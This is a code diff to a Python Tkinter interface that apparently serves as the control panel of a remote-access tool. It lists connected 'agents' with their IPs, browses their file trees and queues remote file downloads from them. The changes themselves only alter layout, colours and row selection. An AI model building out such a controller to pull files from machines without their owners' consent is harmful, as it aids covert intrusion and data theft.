@@ -110,18 +110,28 @@ def open_file_window(agent_id, tree):
 
     user = get_user(agent_id)
     label = user.name if user else agent_id
+    ip = user.ip if user else ""
 
     win = tk.Toplevel(root)
     win.title(f"Files — {label}")
-    win.geometry("820x480")
+    win.geometry("820x520")
     win.configure(bg="#0D0D0D")
     win.resizable(False, False)
 
-    bottom_frame = tk.Frame(win, bg="#0D0D0D", highlightthickness=0)
-    bottom_frame.pack(side="bottom", fill="x", padx=10, pady=(0, 10))
+    # Header bar
+    header = tk.Frame(win, bg="#111111", highlightthickness=0)
+    header.pack(fill="x")
+    tk.Label(header, text=f"  {label}   {ip}", bg="#111111", fg="#555555", font=("Menlo", 10)).pack(side="left", pady=7)
+    tk.Frame(win, bg="#2A2A2A", height=1, highlightthickness=0).pack(fill="x")
 
+    # Bottom bar packed first so it doesn't get compressed
+    tk.Frame(win, bg="#2A2A2A", height=1, highlightthickness=0).pack(side="bottom", fill="x")
+    bottom_frame = tk.Frame(win, bg="#111111", highlightthickness=0)
+    bottom_frame.pack(side="bottom", fill="x", ipady=8)
+
+    # Tree area
     tree_frame = tk.Frame(win, bg="#0D0D0D", highlightthickness=0)
-    tree_frame.pack(fill="both", expand=True, padx=10, pady=(10, 0))
+    tree_frame.pack(fill="both", expand=True, padx=10, pady=(8, 0))
 
     y_scroll = ttk.Scrollbar(tree_frame, orient="vertical")
     y_scroll.pack(side="right", fill="y")
@@ -137,7 +147,7 @@ def open_file_window(agent_id, tree):
     file_tree_widget.column("path", width=0, minwidth=0, stretch=False)
     file_tree_widget.column("ftype", width=0, minwidth=0, stretch=False)
     file_tree_widget.tag_configure("dir", foreground="#FFAA00")
-    file_tree_widget.tag_configure("file", foreground="#FFFFFF")
+    file_tree_widget.tag_configure("file", foreground="#CCCCCC")
     file_tree_widget.pack(side="left", fill="both", expand=True)
 
     y_scroll.config(command=file_tree_widget.yview)
@@ -171,15 +181,28 @@ def open_file_window(agent_id, tree):
 
     populate("", tree)
 
+    # Bottom bar contents
+    path_var = tk.StringVar(value="")
     status_var = tk.StringVar(value="")
-    status_label = tk.Label(
-        bottom_frame,
-        textvariable=status_var,
-        bg="#0D0D0D",
-        fg="#00FF88",
-        font=("Menlo", 10)
-    )
-    status_label.pack(side="left")
+
+    tk.Label(
+        bottom_frame, textvariable=path_var,
+        bg="#111111", fg="#444444", font=("Menlo", 9), anchor="w"
+    ).pack(side="left", padx=(12, 0), fill="x", expand=True)
+
+    tk.Label(
+        bottom_frame, textvariable=status_var,
+        bg="#111111", fg="#00FF88", font=("Menlo", 9)
+    ).pack(side="left", padx=8)
+
+    def on_select(event):
+        selected = file_tree_widget.selection()
+        if selected:
+            values = file_tree_widget.item(selected[0], "values")
+            if values:
+                path_var.set(values[0])
+
+    file_tree_widget.bind("<<TreeviewSelect>>", on_select)
 
     def on_download():
         selected = file_tree_widget.selection()
@@ -195,23 +218,16 @@ def open_file_window(agent_id, tree):
         if u:
             u.add_task(f"DOWNLOAD:{path}")
             log(f"[*] Download queued: {path}")
-            status_var.set(f"Downloading: {oos.path.basename(path)}...")
+            status_var.set("Downloading...")
 
-    download_btn = tk.Button(
-        bottom_frame,
-        text="DOWNLOAD",
+    tk.Button(
+        bottom_frame, text="DOWNLOAD",
         command=on_download,
-        bg="#000000",
-        fg="#FFAA00",
-        activebackground="#222222",
-        activeforeground="#FFAA00",
-        relief="flat",
-        highlightthickness=0,
-        highlightbackground="#000000",
-        padx=15,
-        pady=6
-    )
-    download_btn.pack(side="right")
+        bg="#1A1A1A", fg="#FFAA00",
+        activebackground="#2A2A2A", activeforeground="#FFAA00",
+        relief="flat", highlightthickness=0, highlightbackground="#111111",
+        padx=15, pady=5, cursor="hand2"
+    ).pack(side="right", padx=(8, 12))
 
     def on_close():
         file_windows.pop(agent_id, None)
@@ -274,7 +290,7 @@ def render():
     style.theme_use("clam")
     style.configure("Treeview", background="#0D0D0D", foreground="#FFFFFF", fieldbackground="#0D0D0D", rowheight=28, bordercolor="#444444", borderwidth=1, relief="solid")
     style.configure("Treeview.Heading", background="#111111", foreground="#AAAAAA", relief="flat")
-    style.map("Treeview", background=[("selected", "#1E1E1E")], foreground=[("selected", "#FFFFFF")])
+    style.map("Treeview", background=[("selected", "#1E1E1E")])
     style.configure("Vertical.TScrollbar", background="#333333", troughcolor="#1A1A1A", bordercolor="#333333", arrowcolor="#888888", relief="flat")
     style.configure("Horizontal.TScrollbar", background="#333333", troughcolor="#1A1A1A", bordercolor="#333333", arrowcolor="#888888", relief="flat")
     style.map("Vertical.TScrollbar", background=[("active", "#555555")])
@@ -301,8 +317,27 @@ def render():
 
     connections_table.tag_configure("online", foreground="#00FF88")
     connections_table.tag_configure("offline", foreground="#FF4444")
+    connections_table.tag_configure("online_sel", foreground="#00FF88", background="#1E1E1E")
+    connections_table.tag_configure("offline_sel", foreground="#FF4444", background="#1E1E1E")
 
     connections_table.pack(fill="both", expand=True, padx=15, pady=10)
+
+    selected_agent = [None]
+
+    def on_row_click(event):
+        item = connections_table.identify_row(event.y)
+        if not item:
+            return
+        old = selected_agent[0]
+        selected_agent[0] = item
+        if old and connections_table.exists(old):
+            old_tags = list(connections_table.item(old, "tags"))
+            connections_table.item(old, tags=[t.replace("_sel", "") for t in old_tags])
+        cur_tags = list(connections_table.item(item, "tags"))
+        connections_table.item(item, tags=[t if t.endswith("_sel") else t + "_sel" for t in cur_tags])
+        return "break"
+
+    connections_table.bind("<ButtonPress-1>", on_row_click)
 
     # =========================
     # Actions
@@ -311,14 +346,10 @@ def render():
     actions_frame.pack(side="bottom", pady=(0, 15))
 
     def get_selected_agent_id():
-        selected = connections_table.selection()
-
-        if not selected:
+        if not selected_agent[0]:
             log("[-] No agent selected")
             return None
-
-
-        return selected[0]
+        return selected_agent[0]
 
     def send_ui_task(task_name):
         agent_id = get_selected_agent_id()
@@ -396,14 +427,16 @@ def render():
 
 
     def update_connections_list():
-        selected = connections_table.selection()
-        selected_id = selected[0] if selected else None
+        selected_id = selected_agent[0]
 
         for item in connections_table.get_children():
             connections_table.delete(item)
 
         for user in users:
-            status_tag = "online" if user.status == "online" else "offline"
+            if user.status == "online":
+                status_tag = "online_sel" if user.id == selected_id else "online"
+            else:
+                status_tag = "offline_sel" if user.id == selected_id else "offline"
 
             connections_table.insert(
                 "",
@@ -418,10 +451,6 @@ def render():
                 ),
                 tags=(status_tag,)
             )
-
-        if selected_id and connections_table.exists(selected_id):
-            connections_table.selection_set(selected_id)
-            connections_table.focus(selected_id)
 
         root.after(1000, update_connections_list)
 
